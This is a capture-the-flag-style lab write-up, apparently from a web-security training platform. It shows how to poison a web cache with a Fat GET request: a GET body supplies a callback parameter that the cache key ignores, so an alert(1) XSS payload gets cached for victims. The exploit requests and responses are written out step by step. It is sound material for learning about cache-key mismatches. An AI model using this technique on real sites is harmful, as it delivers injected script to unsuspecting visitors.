# Web Cache Poisoning via a Fat GET Request

## Lab Summary



This lab demonstrates **Web Cache Poisoning using a Fat GET request**.



A **Fat GET request** is a GET request that contains a request body.



The vulnerability occurs because:



* The application processes a `callback` parameter from the GET body.

* The cache does **not** include the GET body when generating the cache key.



This creates a discrepancy between what the cache identifies as the request and what the backend processes.



---



## Goal



Poison the cache with a response containing:



```javascript

alert(1)

```



When the victim requests the JavaScript resource, the poisoned response should be served from the cache and the XSS 
payload should execute in the victim's browser.



---



## Vulnerability



The application imports:



```text

/js/geolocate.js?callback=setCountryCookie

```



The normal response contains:



```javascript

setCountryCookie({"country":"United Kingdom"});

```



The `callback` parameter controls the JavaScript function used in the response.



However, the application also accepts `callback` from the GET request body.



For example:



```http

GET /js/geolocate.js?callback=setCountryCookie HTTP/2

Content-Type: application/x-www-form-urlencoded



callback=arbitraryFunction

```



The response becomes:



```javascript

arbitraryFunction({"country":"United Kingdom"});

```



The URL remains unchanged, meaning the cache key can remain the same while the backend generates a different response.



---



## Attack Flow



```text

Fat GET request

      ↓

Duplicate callback parameter

      ↓

Backend reads callback from GET body

      ↓

Cache ignores the GET body

      ↓

Inject alert(1)

      ↓

Malicious response is cached

      ↓

Victim requests normal resource

      ↓
Poisoned response is served

      ↓

XSS executes
```



---



## Exploitation Steps



### 1. Identify the JavaScript endpoint




Observe that the application loads:



```text

/js/geolocate.js?callback=setCountryCookie

```




Send the request to **Burp Repeater**.



---



### 2. Test the GET request body



Add:



```http

Content-Type: application/x-www-form-urlencoded



callback=arbitraryFunction

```



The server responds with:



```javascript

arbitraryFunction({"country":"United Kingdom"});

```



This confirms that the backend processes the `callback` parameter from the GET body.



---



### 3. Analyze the cache



Useful response headers include:



```http

Cache-Control: max-age=35

Age: 21

X-Cache: hit

```



#### `X-Cache: hit`



The response was served from the cache.



#### `X-Cache: miss`


The request reached the backend instead of using an existing cached response.



#### `Age`



Indicates how long the cached response has been stored.



---



### 4. Bypass the Existing Cached Response



If an old response is already cached, temporarily add:



```http

Origin: https://example.com

```



This was used as a temporary cache-busting technique during testing.



The response changed to:



```http

X-Cache: miss

Age: 0

```



and reflected the body parameter:



```javascript

arbitraryFunction({"country":"United Kingdom"});

```


This confirmed that the backend was using the GET body.



> The `Origin` header is only used during testing. It is not the root cause of the vulnerability.



---



### 5. Inject the XSS Payload

Replace the body with:


```http

callback=alert(1)


```



Final request:



```http

GET /js/geolocate.js?callback=setCountryCookie HTTP/2

Host: 0aac007003fc3b678048f334002b0053.web-security-academy.net

Content-Type: application/x-www-form-urlencoded



callback=alert(1)

```



The server returns:



```javascript

alert(1)({"country":"United Kingdom"});

```



The XSS payload is now reflected in the JavaScript response.



---




### 6. Poison the Cache



Remove the temporary `Origin` header and send the request again.



After successful poisoning, the response showed:



```http

Cache-Control: max-age=35

Age: 3

X-Cache: hit

```



while still containing:



```javascript

alert(1)({"country":"United Kingdom"});

```



This confirms that the malicious response has been stored in the cache.



---



## Why Does the Cache Poisoning Work?



The cache effectively uses:



```text

/js/geolocate.js?callback=setCountryCookie

```



as the cache key.



However, the backend processes:



```text

callback=alert(1)

```



from the GET body.




Therefore:



```text

Cache Key

    ↓

/js/geolocate.js?callback=setCountryCookie

```




but:



```text

Backend Input

    ↓

callback=alert(1)

```



The cache stores the malicious response under the normal cache key.



When the victim requests the normal resource, the poisoned response is returned.



---





## Key Takeaways




* A GET request can contain a body in some implementations.
* The backend may process GET body parameters even when the cache ignores them.

* A mismatch between **cache key inputs** and **backend inputs** can lead to Web Cache Poisoning.

* `X-Cache`, `Age`, and `Cache-Control` are useful when analyzing cache behavior.

* The critical issue is:



```text

GET body is processed by the application

                ≠

GET body is ignored by the cache key

```



This discrepancy allowed an XSS payload to be stored in the cache.



---



## Result



The cache was successfully poisoned with:



```javascript

alert(1)

```



The victim receives the poisoned JavaScript response from the cache, causing the XSS payload to execute.



✅ **Lab Solved**

